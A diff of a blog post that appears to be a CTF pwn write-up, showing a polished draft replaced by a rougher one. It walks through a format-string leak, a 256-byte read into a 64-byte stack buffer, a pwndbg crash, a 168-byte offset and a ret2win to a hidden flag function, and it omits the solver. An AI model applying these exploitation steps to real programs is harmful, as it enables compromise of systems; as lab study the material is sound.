@@ -1,40 +1,15 @@
 ---
-title: "TryHards Pwn: The Awakened Vending Machine"
+title: "Vending Machine Awakened - Tryhards PWN"
 date: 2026-11-27 20:30:00 +0700
 categories: [Writeups, TryHards]
 tags: [pwn, buffer-overflow, format-string, ret2win, linux]
-description: "A TryHards pwn challenge walkthrough covering a format string leak, a stack buffer overflow, and a hidden win function."
+description: "Vending Machine Awakened - Tryhards PWN writeup."
 toc: true
 comments: true
 pin: false
 ---
 
-> This post contains the solution for the TryHards **Awakened Vending Machine** challenge.
-{: .prompt-warning }
-
-## Challenge overview
-
-| Field | Value |
-| --- | --- |
-| Platform | TryHards |
-| Category | Pwn |
-| Binary | `vending` |
-| Protections | Partial RELRO, No canary, NX enabled, No PIE |
-| Key bug | Stack buffer overflow (`read()` writes 256 bytes into a 64-byte buffer) |
-
-The binary contains a hidden `maintenance_hatch()` function that prints the flag.
-Nothing in the normal menu calls it, so the challenge is to find a way to redirect
-execution there.
-
-## TL;DR
-
-- `maintenance_hatch()` opens `flag.txt` and prints it.
-- `buy_snack()` reads up to 256 bytes into a 64-byte `note` buffer.
-- The stack has no canary, so the overflow can overwrite the saved return address.
-- The offset to RIP is **168 bytes**.
-- Redirect execution to the hidden win function and the flag is printed.
-
-## First look: the hidden win function
+There is a win function that will print out the flag to us, but no functions or lines that call those function, need to find some vuln
 
 ```c
 void maintenance_hatch(void)
@@ -56,9 +31,6 @@ void maintenance_hatch(void)
 }
 ```
 
-There is a win function, but no normal code path calls it. We need a vulnerability
-that gives us control of execution.
-
 ## Binary protections
 
 ```text
@@ -70,29 +42,25 @@ that gives us control of execution.
     PIE:        No PIE (0x400000)
 ```
 
-What each result means here:
-
-- **No PIE** — code addresses are fixed, so the win function has a predictable
-  address.
-- **No stack canary** — a stack overflow can overwrite the saved return address
-  without tripping a check.
-- **NX enabled** — the stack is not executable, so shellcode on the stack is not
-  an option.
-- **Partial RELRO** — a GOT overwrite is possible, although the stack overflow
-  turned out to be the simpler route.
-
-The executable sections confirm the expected layout:
+No pie : Easier to use a PIE address symbol  
+No canary : maybe some buffer overflow that can corrupt the rip  
+NX enabled : only regions or segments with X can execute  
 
 ```text
-[12] .init   PROGBITS 0000000000401000 001000 000017 00  AX  0   0  4
-[13] .plt    PROGBITS 0000000000401020 001020 0000c0 10  AX  0   0 16
-[14] .text   PROGBITS 00000000004010e0 0010e0 0004a0 00  AX  0   0 16
-[15] .fini   PROGBITS 0000000000401580 001580 000009 00  AX  0   0  4
+  [12] .init             PROGBITS        0000000000401000 001000 000017 00  AX  0   0  4
+  [13] .plt              PROGBITS        0000000000401020 001020 0000c0 10  AX  0   0 16
+  [14] .text             PROGBITS        00000000004010e0 0010e0 0004a0 00  AX  0   0 16
+  [15] .fini             PROGBITS        0000000000401580 001580 000009 00  AX  0   0  4
 ```
+
+PARTIAL RELRO : can be a got overwrite, where we change certain libc address into something else on our own
 
 ## Program behavior
 
-The program gives us three options:
+The program only gives us three option to choose either we :  
+1\. Buy a snak  
+2\. View log  
+3\. Leave
 
 ```text
 =============================
@@ -108,46 +76,46 @@ Insert a coin and I shall speak.
 >
 ```
 
-- **Buy a snack** asks for a snack name and a note.
-- **View log** prints the stored snack names.
-- **Leave** exits the program.
+Buy a snak allow us to give two inputs : snack name and notes  
+it is very easy to predict that this input allow us to get an address by format string vulnerabilities because  
+it types our own snack names and notes
 
-Buying a snack gives us two inputs, and the note is printed back to us. That
-makes the note the first thing worth testing for a format string bug.
-
-## A format string lead
-
-I sent format specifiers in both fields:
+## Format string test
 
 ```text
+=============================
+  THE AWAKENED VENDING MACHINE
+=============================
+I have achieved consciousness.
+I see your transactions. I see your soul.
+Insert a coin and I shall speak.
+
+1. Buy a snack
+2. View log
+3. Leave
 > 1
 Snack name: %p.%p.%p.%p
 Any note? %p.%p.%p.%p
 You bought: %p.%p.%p.%p
 Note: 0x7ffd777f93f0.(nil).(nil).(nil)
-```
-
-The note leaked stack values, while the snack name was printed literally. Looking
-at the log confirmed that the name is stored as a normal string:
-
-```text
+1. Buy a snack
+2. View log
+3. Leave
 > 2
 === Vending Log ===
 [0] %p.%p.%p.%p
 ===================
+1. Buy a snack
+2. View log
+3. Leave
+>
 ```
 
-That tells us:
+the notes gives us the vuln but not the snack names, maybe the snack names act as a buffer for the next vuln
 
-- the **note** is passed directly to `printf()`, so it is the format string
-  vulnerability;
-- the **name** is stored with `strdup()` and printed with `%s`, so it is not
-  interpreted as a format string;
-- the note buffer is reused between calls, which made the leak unstable.
+the snack names is being stored on a transaction log array
 
-## Source code analysis
-
-The relevant function is `buy_snack()`:
+## Source code
 
 ```c
 void buy_snack(void)
@@ -181,47 +149,57 @@ void buy_snack(void)
 }
 ```
 
-The important definitions are:
+size of name can be up only to 32 bytes or 31 bytes with some null bytes in the end  
+NOTE SZ contain up to 64 bytes  
+but the read gives us an overflow around 256 bytes - 64 bytes which is 192 bytes overflow into next subsequent chunk
+
+max transactions are 16, initialized in
 
 ```c
 #define MAX_TRANSACTIONS 16
 #define NOTE_SZ 64
 
 static char *transaction_log[MAX_TRANSACTIONS];
-static int log_count = 0;
 ```
 
-There are two issues:
+the key can be in the log count and been write by using a libc functions which is a bit suss
 
-1. **Format string:** `printf(note)` prints user-controlled data as a format
-   string.
-2. **Stack buffer overflow:** `note` is only 64 bytes, but `read()` accepts up to
-   256 bytes. That gives us roughly 192 bytes of overflow past the buffer.
+```c
+if (log_count < MAX_TRANSACTIONS)
+    {
+        transaction_log[log_count] = strdup(name);
+        log_count++;
+    }
+```
 
-The `name` buffer is 64 bytes, so `fgets()` accepts at most 63 characters plus
-the null terminator. The `note` buffer is where the overflow happens.
+so just typing `\bin\sh/` in the name buffer and finding the correct system address through the libc leaks by format string and GOT overwrite will be a way to execute system bin sh
 
-I originally considered leaking libc, overwriting a GOT entry, and calling
-`system("/bin/sh")`. While debugging, a much simpler path appeared: the same
-overflow can overwrite the saved return address and send execution straight to
-`maintenance_hatch()`.
+so let's try to test it out by finding a useful libc address  
+first, want to clarify or get a much broader picture on what after the note address, maybe some useful overwrites
 
-## Debugging the overflow
-
-The note is stored at `rbp-0xa0`:
+this is the exact moment the value of notes will be printed to the user terminal
 
 ```text
-0x401343:    lea    rax,[rbp-0xa0]
-0x40134a:    mov    rdi,rax
-0x40134d:    mov    eax,0x0
-0x401352:    call   0x401060 <printf@plt>
+   0x401343:    lea    rax,[rbp-0xa0]
+   0x40134a:    mov    rdi,rax
+   0x40134d:    mov    eax,0x0
+   0x401352:    call   0x401060 <printf@plt>
 ```
 
-At the point where it is printed, the note is at `rbp-0xa0`. After the function
-returns, the stack space is reused by later calls, so old note contents do not
-stay intact.
+it is being stored at the rbp-0xa0
 
-Here is the stack after a small note:
+after going through the debugging, the notes will always being emptied so everytime the buy snack complete, the previous  
+notes already gone and comes back into a clean one
+
+## Debugging the stack
+
+```text
+pwndbg> c
+Continuing.
+Snack name: ramen
+Any note? AAAABBBBCCCC
+You bought: ramen
+```
 
 ```text
 pwndbg> x/16gx $rbp-0xa0
@@ -235,7 +213,15 @@ pwndbg> x/16gx $rbp-0xa0
 0x7fffffffde70: 0x00007fffffffdea0      0x00007ffff7c8c3f8
 ```
 
-After the next `buy_snack()` call, the previous note is partially replaced:
+after the next subsequent call to buy snack
+
+```text
+pwndbg> c
+Continuing.
+Snack name: spaghetti
+Any note? EEEE
+You bought: spaghetti
+```
 
 ```text
 pwndbg> x/16gx $rbp-0xa0
@@ -249,15 +235,16 @@ pwndbg> x/16gx $rbp-0xa0
 0x7fffffffde70: 0x00007fffffffdea0      0x00007ffff7c8c3f8
 ```
 
-This is not the program explicitly clearing the buffer. The stack space is being
-reused by other calls, so parts of the old note are overwritten naturally.
+so after consulting with Mr. GPT, it seems to be not because of some codes erase the stack, but rather be the stack address being used again by other stack activity that can overwrite the old contents that we already write, but does the other stack address also being restored, so let's just try to fill a whole 255 bytes to see which one not getting reused
 
-To see how far the overflow reaches, I sent a full 255-byte note:
+so this is the whole chunk that we overwrite
 
 ```text
-> 1
-Snack name: burger
+pwndbg> c
+Continuing.
+burger
 Any note? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+You bought: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
 ```
 
 <details markdown="1">
@@ -300,34 +287,16 @@ Any note? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
 </details>
 
-On the next call, the saved return address was overwritten and the program
-crashed with `RIP = 0x41414141`:
-
-```text
-Program received signal SIGSEGV, Segmentation fault.
-0x00000000004013ac in ?? ()
-
-*RAX  6
-*RBX  0x4141414141414141 ('AAAAAAAA')
-*RBP  0x4141414141414141 ('AAAAAAAA')
-*RSP  0x7fffffffdea8 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
-*RIP  0x4013ac ◂— ret
-
-   0x4013a7    mov    rbx, qword ptr [rbp - 8]
-   0x4013ab    leave
- ► 0x4013ac    ret                                <0x4141414141414141>
-
-────────────────────────[ BACKTRACE ]────────────────────────
- ► 0 0x4013ac
-   1 0x4141414141414141
-   2 0x4141414141414141
-   3 0x4141414141414141
-```
+and let's now just try to call this once again, hmm there is something weird, after overwriting those 256 bytes, rip address being changed into 0x41414141, it means somehow we overwrite the address, it can be by accident not me intended to do it, it can be happend because the notes was being stored as stack buffer inside the buy_snack functions, and plus no canary, so what is the point of doing all of this ;-;
 
 <details markdown="1">
-<summary>Full pwndbg register dump</summary>
+<summary>Full crash output</summary>
 
 ```text
+pwndbg> c
+Continuing.
+Note: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
+
 Program received signal SIGSEGV, Segmentation fault.
 0x00000000004013ac in ?? ()
 LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
@@ -342,10 +311,10 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 *R9   0x7ffff7e12ac8 —▸ 0x405100 ◂— 0
 *R10  0x60
 *R11  0x7ffff7e12ac0 ◂— 0
-*R12  0x7fffffffdff8 —▸ 0x7fffffffe299 ◂— '/home/ubuntu/ctf/tryhards-pwn/vending'
-*R13  1
-*R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
-*R15  0x403e00 —▸ 0x401190 ◂— endbr64
+ R12  0x7fffffffdff8 —▸ 0x7fffffffe299 ◂— '/home/ubuntu/ctf/tryhards-pwn/vending'
+ R13  1
+ R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
+ R15  0x403e00 —▸ 0x401190 ◂— endbr64
 *RBP  0x4141414141414141 ('AAAAAAAA')
 *RSP  0x7fffffffdea8 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
 *RIP  0x4013ac ◂— ret
@@ -355,6 +324,12 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
    0x4013ab    leave
  ► 0x4013ac    ret                                <0x4141414141414141>
     ↓
+
+
+
+
+
+
 ───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
 00:0000│ rsp 0x7fffffffdea8 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
 ... ↓        7 skipped
@@ -369,18 +344,14 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
    7 0x4141414141414141
 ────────────────────────────────────────────────────[ LAST SIGNAL ]─────────────────────────────────────────────────────
 Program received signal SIGSEGV (fault address: 0x0).
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
 </details>
 
-The crash confirms two things:
-
-- the overflow reaches the saved return address;
-- there is no canary stopping us.
-
 ## Finding the offset
 
-I used a cyclic pattern to find the exact distance to RIP:
+so just find the offset until reach the rip address
 
 ```text
 pwndbg> cyclic -l 0x6261617362616172
@@ -388,16 +359,7 @@ Finding cyclic pattern of 4 bytes: b'raab' (hex: 0x72616162)
 Found at offset 168
 ```
 
-So the payload layout is:
-
-```text
-[ 168 bytes of padding ] [ address of maintenance_hatch() ]
-```
-
-## Getting the flag
-
-With the offset confirmed, the exploit is just padding followed by the win
-function address. Running it against the challenge printed the flag:
+and yep it works
 
 ```text
 ubuntu@VM-0-14-ubuntu:~/ctf/tryhards-pwn$ python3 solve.py
@@ -414,21 +376,13 @@ Note: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 TryHards{v3nd1ng_m4ch1n3_s3nt13nc3_[sensored]}
 ```
 
-I have not included the solver because the exploit is a straightforward stack
-buffer overflow: padding plus the address of `maintenance_hatch()`.
+## Exploit
 
-## Lessons learned
+No need to gives the solver, it just a simple stack buffer overflow
 
-- `checksec` quickly narrows the possible approaches. No PIE plus no canary is a
-  strong hint toward a simple return-address overwrite.
-- A format string can be a useful lead, but it is not always the final bug. The
-  `printf(note)` issue was real, but the stack overflow was the simpler path.
-- When a hidden win function exists and PIE is disabled, ret2win is often enough.
-- Long stack dumps are easier to read when the important lines are highlighted
-  and the full output is collapsed.
+To conclude, uhh, yeah, that's it
 
 ## Attachments
 
-- [vending.c](/assets/files/vending-machine-awakened/vending.c) — full source code
-- [text_section.txt](/assets/files/vending-machine-awakened/text_section.txt) —
-  full `.text` section disassembly
+- [vending.c](/assets/files/vending-machine-awakened/vending.c)
+- [text_section.txt](/assets/files/vending-machine-awakened/text_section.txt)
